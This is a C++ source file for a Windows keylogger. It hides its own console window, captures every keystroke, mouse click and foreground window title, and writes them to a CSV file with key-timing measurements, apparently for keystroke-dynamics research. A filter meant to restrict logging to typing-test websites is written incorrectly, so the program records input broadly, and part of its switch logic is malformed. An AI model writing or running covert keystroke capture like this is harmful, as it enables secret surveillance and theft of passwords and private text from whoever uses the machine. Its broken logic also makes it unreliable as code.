#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <chrono>
#include <thread>
#include <vector>
//using namespace std;

std::vector<std::string> websites = {
    "monkeytype",
    "typeracer",
    "typeonline",
    "rapidtyping",
    "sense-lang",
    "typingtest",
    "typing-lessons",
    "how-to-type",
    "typingzone",
    "typrx",
    "typera",
    "10fastfingers"
};

void StealthMode();
void StartLogging();
uint64_t timeSinceEpochMillisec();

uint64_t timeSinceEpochMillisec() {
    using namespace std::chrono;
    return duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count();
}

int main() {
    StealthMode();
    StartLogging();

    return 0;
}

void StealthMode() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

void StartLogging() {


    // All features that are extracted
    // https://imgur.com/kNv5XeQ
    // The table should look like
    // Date | Time | Button Clicked | Window | KD1 | KD2 | UDDL | DDDL | UUDL | DUDL


    char c;
    std::string key1Str = "", key2Str = "", final = "";
    char windowTitle[256] = "";

    std::cout << "Keylogger Started " << std::endl;

    auto prevTimestamp = std::chrono::system_clock::now();

    while (true) {
start:
        HWND foregroundWindow = GetForegroundWindow();
        GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
        std::string window = windowTitle;

        for(auto website : websites) {
            if(window.find(website)) goto start;
        }

        //auto currentTimestamp = std::chrono::high_resolution_clock::now();

        uint64_t time = timeSinceEpochMillisec();
        std::chrono::time_point<std::chrono::high_resolution_clock> key1Up, key2Up, key1Down, key2Down;
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {

                static bool first = true;

                const auto currentTimestamp = std::chrono::system_clock::now();
                //auto interval = std::chrono::duration_cast<std::chrono::milliseconds>(currentTimestamp - prevTimestamp);
                auto timestamp = std::chrono::system_clock::to_time_t(currentTimestamp);
                std::tm* localTime = std::localtime(&timestamp);

                char dateStr[11];
                std::strftime(dateStr, sizeof(dateStr), "%Y-%m-%d", localTime);

                char timeStr[9];
                std::strftime(timeStr, sizeof(timeStr), "%H:%M:%S", localTime);

                std::ofstream write("Record4.csv", std::ios::app);
                if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    final += (c + 32);
                }

                else if ((c > 64) && (c < 91))
                {
                    final += c;
                }

                else
                {
                    switch (c) 
                    {
                        if (!GetAsyncKeyState(0x10)) {
                            final += c;
                        }
                        else {
                            case 48:
                                final += ")";
                                break;
                            
                            case 49:
                                final += "!";
                                break;

                            case 50:
                                final += "@";
                                break;

                            case 51:
                                final += "#";
                                break;

                            case 52:
                                final += "$";
                                break;

                            case 53:
                                final += "%";
                                break;

                            case 54:
                                final += "^";
                                break;

                            case 55:
                                final += "&";
                                break;

                            case 56:
                                final += "*";
                                break;
                            
                            case 57:
                                final += "(";
                                break;

                            case VK_LBUTTON:
                                final += "<LEFT CLICK>";
                                break;
                            
                            case VK_RBUTTON:
                                final += "<RIGHT CLICK>";
                                break;

                            case VK_ESCAPE:
                                final += "<ESC>";
                                break;
                            
                            case VK_SPACE:
                                final += "<SPACE>";
                                break;

                            case VK_RETURN:
                                final += "<RETURN>";
                                break;

                            case VK_TAB:
                                final += "<TAB>";
                                break;

                            case VK_BACK:
                                final += "<BACKSPACE>";
                                break;

                            case VK_DELETE:
                                final += "<DEL>";
                                break;

                            default:
                                final += (char)c;
                                break;
                        }
                    }
                }

                if(first){
                    key1Str += final;
                } else {
                    key2Str += final;
                }
                final = "";
                
                uint64_t key1 = 0;
                uint64_t key2 = 0;
                uint64_t test1 = 0, test2 = 0;
                //std::chrono::steady_clock::time_point key1Up, key2Up, key1Down, key2Down;// = std::chrono::high_resolution_clock::now();
                if(first){
                    key1Down = std::chrono::high_resolution_clock::now();
                    while(GetAsyncKeyState(c) == -32767){
                        key1++;
                        std::this_thread::sleep_for(std::chrono::milliseconds(1));
                        test1++;
                    }
                    key1Up = std::chrono::high_resolution_clock::now();
                    first = false;
                } else {
                    key2Down = std::chrono::high_resolution_clock::now();
                    while(GetAsyncKeyState(c) == -32767){
                        key2++;
                        std::this_thread::sleep_for(std::chrono::milliseconds(1));
                        test2++;
                    }
                    key2Up = std::chrono::high_resolution_clock::now();
                    first = true;
                }

                if(first){
                    auto UDDL = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Down - key1Up);
                    auto UUDL = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Up - key1Up);
                    auto DUDL = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Up - key1Down);
                    auto DDDL = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Down - key1Down);
                    auto key1 = std::chrono::duration_cast<std::chrono::nanoseconds>(key1Up - key1Down);
                    auto key2 = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Up - key2Down);
                    write << dateStr << ","
                        << timeStr << ","
                        << key1Str << ","
                        << key2Str << ","
                        << windowTitle << ","
                        << key1.count() << ","
                        << key2.count() << ","
                        << UDDL.count() << ","
                        << DDDL.count() << ","
                        << UUDL.count() << ","
                        << DUDL.count() << std::endl;
                    key1Str = key2Str = "";
                }
                prevTimestamp = currentTimestamp;


            }
        }
    }
}